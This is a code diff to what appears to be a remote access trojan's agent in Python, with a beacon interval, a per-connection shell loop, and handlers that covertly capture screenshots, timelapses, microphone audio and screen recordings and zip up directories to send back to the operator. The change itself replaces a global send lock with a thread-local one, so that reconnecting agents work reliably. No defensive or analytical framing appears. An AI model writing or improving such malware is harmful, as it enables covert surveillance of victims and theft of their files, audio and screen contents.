@@ -59,6 +59,29 @@ _timelapse_stop = threading.Event()
 # Beacon sleep interval — 0 means no sleep between command polls (legacy behaviour)
 _beacon_sleep: float = 0.0
 
+# ---------------------------------------------------------------------------
+# Per-connection send lock  (thread-local, one fresh Lock per run_shell call)
+# ---------------------------------------------------------------------------
+# Storing the lock in threading.local() means each agent connection (which
+# runs run_shell() in its own thread) has its own independent lock.
+# Reconnecting agents never inherit the lock from a previous dead session.
+
+_local = threading.local()
+
+
+def _set_send_lock(lock: threading.Lock) -> None:
+    """Register the send lock for the current shell-loop thread."""
+    _local.send_lock = lock
+
+
+def get_send_lock() -> threading.Lock:
+    """Return the send lock for the current shell-loop thread."""
+    lock = getattr(_local, "send_lock", None)
+    if lock is None:
+        lock = threading.Lock()
+        _local.send_lock = lock
+    return lock
+
 
 # ---------------------------------------------------------------------------
 # Command router
@@ -192,7 +215,7 @@ def _screenshot(conn, args: list[str]) -> str | None:
         fname = "_screenshot.jpg"
         with open(fname, "wb") as f:
             f.write(data)
-        with _send_lock:
+        with get_send_lock():
             _send_msg(conn, "FILE_OK")
             _send_file(conn, fname)
         try:
@@ -213,7 +236,7 @@ def _screenshot(conn, args: list[str]) -> str | None:
             fname = "_screenshot.jpg"
             with open(fname, "wb") as f:
                 f.write(buf.getvalue())
-            with _send_lock:
+            with get_send_lock():
                 _send_msg(conn, "FILE_OK")
                 _send_file(conn, fname)
             try:
@@ -240,7 +263,7 @@ def _record(conn, args: list[str]) -> str | None:
         audio = _sd.rec(int(seconds * rate), samplerate=rate, channels=1, dtype="int16")
         _sd.wait()
         _sf.write(fname, audio, rate)
-        with _send_lock:
+        with get_send_lock():
             _send_msg(conn, "FILE_OK")
             _send_file(conn, fname)
         try:
@@ -299,7 +322,7 @@ def _screenshot_timelapse(conn, args: list[str]) -> str | None:
             for idx, data in enumerate(frames):
                 zf.writestr(f"frame_{idx:03d}.jpg", data)
 
-        with _send_lock:
+        with get_send_lock():
             _send_msg(conn, "FILE_OK")
             _send_file(conn, zip_path)
         try:
@@ -326,7 +349,7 @@ def _screenshot_timelapse(conn, args: list[str]) -> str | None:
             with zipfile.ZipFile(zip_path, "w", zipfile.ZIP_STORED) as zf:
                 for idx, data in enumerate(frames_pil):
                     zf.writestr(f"frame_{idx:03d}.jpg", data)
-            with _send_lock:
+            with get_send_lock():
                 _send_msg(conn, "FILE_OK")
                 _send_file(conn, zip_path)
             try:
@@ -951,7 +974,7 @@ def _zip_download(conn, args: list[str]) -> str | None:
                         full = os.path.join(dirpath, f)
                         arcname = os.path.relpath(full, os.path.dirname(target))
                         zf.write(full, arcname)
-        with _send_lock:
+        with get_send_lock():
             _send_msg(conn, "FILE_OK")
             _send_file(conn, tmp_zip)
         try:
@@ -1712,7 +1735,7 @@ def _screenshot_region(conn, args: list[str]) -> str | None:
         fname = "_region.jpg"
         with open(fname, "wb") as f:
             f.write(buf.tobytes())
-        with _send_lock:
+        with get_send_lock():
             _send_msg(conn, "FILE_OK")
             _send_file(conn, fname)
         try:
@@ -3393,7 +3416,7 @@ def _screenrecord(conn, args: list[str]) -> str | None:
 
         writer.release()
 
-        with _send_lock:
+        with get_send_lock():
             _send_msg(conn, "FILE_OK")
             _send_file(conn, out_path)
         try:
@@ -3452,7 +3475,7 @@ def _screenrecord(conn, args: list[str]) -> str | None:
                               timeout=seconds + 30)
         if not os.path.isfile(out_path):
             return "[-] ffmpeg completed but output file not found"
-        with _send_lock:
+        with get_send_lock():
             _send_msg(conn, "FILE_OK")
             _send_file(conn, out_path)
         try:
